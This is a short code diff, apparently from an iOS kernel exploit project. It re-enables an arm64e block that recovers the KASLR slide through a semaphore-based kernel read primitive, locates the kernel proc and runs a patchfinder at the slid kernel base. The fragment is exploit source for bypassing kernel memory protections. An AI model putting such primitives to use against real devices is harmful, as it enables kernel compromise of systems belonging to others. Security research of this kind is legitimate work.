@@ -134,14 +134,14 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     uint64_t task_kaddr = static_kget(semaphore, uint64_t, owner, semaphore_kaddr);
     uint64_t proc_kaddr = task_kaddr - dynamic_sizeof(proc);
     kfd->info.kernel.kernel_proc = proc_kaddr;
-    /*
+    
     if(isarm64e()) {
         kread_sem_open_kaslr(kfd, task_kaddr);
         print_x64(kfd->info.kernel.kernel_slide);
         if(import_kfd_offsets() == -1)
             do_dynamic_patchfinder(kfd, kfd->info.kernel.kernel_slide + 0xFFFFFFF007004000);
     }
-*/
+
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
      */
